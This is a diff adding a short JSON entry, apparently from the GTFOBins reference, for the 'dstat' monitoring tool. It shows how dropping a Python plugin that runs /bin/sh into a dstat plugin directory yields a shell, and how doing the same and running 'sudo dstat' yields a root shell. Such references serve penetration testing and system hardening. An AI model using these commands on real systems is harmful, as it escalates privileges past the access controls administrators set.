@@ -1,0 +1,15 @@
+{
+  "description": "`dstat` allows you to run arbitrary [`python`](/gtfobins/python/) scripts loaded as \"external plugins\" if they are located in one of the directories stated in the `dstat` man page under \"FILES\":\n\n1. `~/.dstat/`\n2. `(path of binary)/plugins/`\n3. `/usr/share/dstat/`\n4. `/usr/local/share/dstat/`\n\nPick the one that you can write into.\n",
+  "functions": {
+    "shell": [
+      {
+        "code": "mkdir -p ~/.dstat\necho 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >~/.dstat/dstat_xxx.py\ndstat --xxx\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
+      }
+    ]
+  }
+}
